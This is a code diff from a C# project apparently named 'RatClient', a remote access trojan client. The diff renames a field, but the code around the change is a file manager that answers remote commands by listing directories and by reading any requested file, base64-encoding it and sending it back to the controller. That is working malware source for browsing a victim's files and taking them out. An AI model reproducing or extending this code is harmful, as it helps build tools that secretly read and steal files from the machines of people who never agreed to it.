@@ -8,13 +8,13 @@ namespace RatClient.Features
     public class FileManager
     {
         #region Variables
-        private Action<object> sendJson;
+        private Action<object> SendJson;
         #endregion
 
         #region Constructor
-        public FileManager(Action<object> sendJson)
+        public FileManager(Action<object> SendJson)
         {
-            this.sendJson = sendJson;
+            this.SendJson = SendJson;
 
             Program.MessageReceived += HandleMessage;
         }
@@ -28,7 +28,7 @@ namespace RatClient.Features
                 string filesAndFolders = GetFilesAndFolders(jsonMessage["path"]);
                 if (!string.IsNullOrEmpty(filesAndFolders))
                 {
-                    sendJson(new { type = "fm_list", filesAndFolders });
+                    SendJson(new { type = "fm_list", filesAndFolders });
                 }
             }
             else if (jsonMessage["type"] == "fm_download")
@@ -38,7 +38,7 @@ namespace RatClient.Features
                 if (File.Exists(filePath))
                 {
                     string data = Convert.ToBase64String(File.ReadAllBytes(filePath));
-                    sendJson(new { type = "fm_upload", name = Path.GetFileName(filePath), data });
+                    SendJson(new { type = "fm_upload", name = Path.GetFileName(filePath), data });
                 }
             }
         }
